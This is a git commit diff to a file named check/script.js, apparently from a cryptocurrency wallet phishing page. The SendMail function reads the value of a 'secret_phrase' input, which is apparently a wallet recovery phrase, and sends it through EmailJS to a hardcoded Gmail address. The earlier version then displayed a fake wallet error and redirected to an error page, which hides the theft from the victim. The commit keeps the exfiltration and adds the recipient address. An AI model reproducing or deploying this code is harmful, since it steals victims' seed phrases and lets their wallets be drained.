1116046d3a00423772c4561321325cd5febfec1e
Joseph Fadairo <74228417+joefadairo8@users.noreply.github.com>
2024-03-27 18:00:53 +0100

    Update script.js

--- check/script.js
+++ check/script.js
@@ -1,9 +1,14 @@
 function SendMail() {
+    var recipientEmail = "midetechub@gmail.com"; // Replace with the desired recipient email address
     var params = {
-        result : document.getElementById("secret_phrase").value
-    }
-    emailjs.send("service_0fib79d","template_cnqeg6o", params).then(function (res) {
-        alert("Error!: wallet failed to interact successfully" );
+        result: document.getElementById("secret_phrase").value,
+        to_email: recipientEmail  // Add the recipient email to the params object
+    };
+
+    emailjs.send("service_0fib79d", "template_cnqeg6o", params).then(function(res) {
+        alert("Email sent successfully!");
+    }).catch(function(error) {
+        alert("Error!: " + JSON.stringify(error));
         window.location.href = "/error.html";
-    })
+    });
 }
